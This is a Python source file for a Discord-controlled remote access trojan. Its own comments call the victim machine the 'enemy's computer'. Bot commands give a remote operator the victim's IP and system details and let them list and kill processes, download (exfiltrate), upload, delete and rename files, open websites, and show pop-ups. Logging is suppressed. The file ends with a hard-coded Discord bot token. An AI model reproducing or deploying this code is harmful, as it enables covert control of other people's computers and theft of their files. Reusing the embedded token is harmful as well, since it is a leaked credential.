import discord
from discord.ext import commands
import tkinter as tk
import requests
import webbrowser
import platform
import psutil
import os
import logging

# Intents
intents = discord.Intents.all()

# Bot setup with intents
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Set logging level for the root logger to CRITICAL
logging.basicConfig(level=logging.CRITICAL)

# Set logging level for the root logger to ERROR
logging.basicConfig(level=logging.ERROR)

# Suppress all logging messages from discord and discord.ext.commands loggers
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.ext.commands').setLevel(logging.CRITICAL)

# Suppress INFO-level messages from the discord.client and discord.gateway loggers
logging.getLogger('discord.client').setLevel(logging.ERROR)
logging.getLogger('discord.gateway').setLevel(logging.ERROR)

# Function to display message in Tkinter window
def display_message(message):
    root = tk.Tk()
    root.title("Message")
    label = tk.Label(root, text=message)
    label.pack()
    root.mainloop()

# Function to get user's IP address
def get_ip():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data.get('ip')
    except Exception as e:
        print(f"Error getting IP address: {e}")
        return None

# Bot command to display IP address
@bot.command()
async def ip(ctx):
    """Shows ip address"""
    ip_address = get_ip()
    if ip_address:
        await ctx.send(f"The computer Ip address is: {ip_address}")
    else:
        await ctx.send("Sorry, I couldn't retrieve your IP address.")

# Bot command to display message in Tkinter window
@bot.command()
async def message(ctx, *, message):
    """Pops up a window at enemys computer with message"""
    # Display message in Tkinter window
    display_message(message)

# Bot command to redirect to a website
@bot.command()
async def redirect(ctx, *, website):
    try:
        # Check if the URL has a protocol, if not, prompt the user to include it
        if not website.startswith('http://') and not website.startswith('https://'):
            await ctx.send("Please include 'http://' or 'https://' in the URL.")
            return
        webbrowser.open(website)
        await ctx.send(f"Redirecting to {website}")
    except Exception as e:
        await ctx.send(f"Error redirecting to {website}: {e}")

# Bot command to display system information
@bot.command()
async def info(ctx):
    """Shows computers info"""
    system_info = f"System: {platform.system()}\n"
    system_info += f"Node Name: {platform.node()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"

    await ctx.send(f"```{system_info}```")

# Bot command to list running processes
@bot.command()
async def list(ctx):
    """Shows running proccesses in a list"""
    running_processes = ""
    for process in psutil.process_iter():
        try:
            process_info = process.as_dict(attrs=['pid', 'name'])
            running_processes += f"PID: {process_info['pid']}, Name: {process_info['name']}\n"
        except psutil.NoSuchProcess:
            pass
    if running_processes:
        await ctx.send(f"```{running_processes}```")
    else:
        await ctx.send("No running processes found.")

# Bot command to kill a process
@bot.command()
async def kill(ctx, pid: int):
    """Kills the programm with the pid"""
    try:
        process = psutil.Process(pid)
        process_name = process.name()
        process.terminate()
        await ctx.send(f"Process with PID {pid} ({process_name}) has been terminated.")
    except psutil.NoSuchProcess:
        await ctx.send(f"No process found with PID {pid}.")

# Function to list files in a directory
def list_files():
    file_list = ""
    for i, file in enumerate(os.listdir()):
        file_list += f"{i+1}. {file}\n"
    return file_list

# Bot command to list files
@bot.command()
async def files(ctx):
    """Shows all files"""
    files = list_files()
    await ctx.send(f"```{files}```")

# Bot command to download a file
@bot.command()
async def download(ctx, number: int):
    """Allows you to download a file from the enemys computer"""
    files = os.listdir()
    if 1 <= number <= len(files):
        file_name = files[number - 1]
        with open(file_name, 'rb') as file:
            await ctx.send(file=discord.File(file))
    else:
        await ctx.send("Invalid file number.")

# Bot command to upload a file
@bot.command()
async def upload(ctx):
    """Allows you to upload a file into enemys computer"""
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach a file to upload.")
        return

    attachment = ctx.message.attachments[0]
    file_name = attachment.filename

    try:
        await attachment.save(file_name)
        await ctx.send(f"File '{file_name}' has been uploaded.")
    except Exception as e:
        await ctx.send(f"Error uploading file: {e}")

# Bot command to delete a file
@bot.command()
async def delete(ctx, number: int):
    """Deletes file"""
    files = os.listdir()
    if 1 <= number <= len(files):
        file_name = files[number - 1]
        try:
            os.remove(file_name)
            await ctx.send(f"File '{file_name}' has been deleted.")
        except Exception as e:
            await ctx.send(f"Error deleting file: {e}")
    else:
        await ctx.send("Invalid file number.")

# Bot command to rename a file
@bot.command()
async def rename(ctx, number: int, new_name: str):
    """renames the file"""
    files = os.listdir()
    if 1 <= number <= len(files):
        old_file_name = files[number - 1]
        try:
            os.rename(old_file_name, new_name)
            await ctx.send(f"File '{old_file_name}' has been renamed to '{new_name}'.")
        except Exception as e:
            await ctx.send(f"Error renaming file: {e}")
    else:
        await ctx.send("Invalid file number.")

# Custom help command
@bot.command()
async def help(ctx):
    """Shows this message"""
    help_message = "This is a list of available commands and their descriptions:\n\n"
    for command in bot.commands:
        if command.help:  # Check if command has a description
            help_message += f"**{command.name}**: {command.help}\n"
        else:
            help_message += f"**{command.name}**: No description available\n"

    await ctx.send(help_message)



# Run the bot
bot.run('MTE5Mjg1MDIwNDM3NDg1OTk1OA.GVxyQS.AlaALmN_FZMUYfxsrcpP1nduiigqKZxQjHnbY0')
